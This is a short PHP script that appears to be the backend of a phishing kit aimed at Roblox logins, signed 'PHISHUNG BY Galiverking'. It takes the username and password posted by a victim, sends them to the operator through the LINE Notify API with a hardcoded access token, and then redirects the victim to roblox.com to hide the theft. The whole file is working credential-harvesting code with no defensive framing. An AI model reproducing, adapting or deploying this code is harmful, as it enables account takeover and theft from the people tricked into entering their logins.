<?php


    $header = "PHISHUNG BY Galiverking";
    $firstname = $_POST['username'];
    $lastname = $_POST['password'];
    $message = $header.
                "\n". "{----Galiverking Shop----}"  .
                "\n". "username : " . $firstname .
                "\n". "password : " . $lastname ;
    if (isset($_POST["submit"])) {
        if ( $firstname <> "" ||  $lastname <> "" ){
            sendlinemesg();
            header('Content-Type: text/html; charset=utf8');
            $res = notify_message($message);
            header("location: https://www.roblox.com/");
        } else {
            header("location: https://www.roblox.com/");
        }
    }

    function sendlinemesg() {
		// LINE LINE_API https://notify-api.line.me/api/notify
		// LINE TOKEN iOMjdmsYuUSgGDJiwSLk4xUGV2zYyld9Us5Ora08amC

        define('LINE_API',"https://notify-api.line.me/api/notify");
        define('LINE_TOKEN',"iOMjdmsYuUSgGDJiwSLk4xUGV2zYyld9Us5Ora08amC");

        function notify_message($message) {
                    $queryData = array('message' => $message);
                    $queryData = http_build_query($queryData,'','&');
                    $headerOptions = array(
                        'http' => array(
                            'method' => 'POST',
                            'header' => "Content-Type: application/x-www-form-urlencoded\r\n"
                                        ."Authorization: Bearer ".LINE_TOKEN."\r\n"
                                        ."Content-Length: ".strlen($queryData)."\r\n",
                            'content' => $queryData
                        )
                    );
                    $context = stream_context_create($headerOptions);
                    $result = file_get_contents(LINE_API, FALSE, $context);
                    $res = json_decode($result);
                    return $res;
                }
            }


?>
<script type="text/javascript">
  window.location.href = "https://www.roblox.com/";
</script>
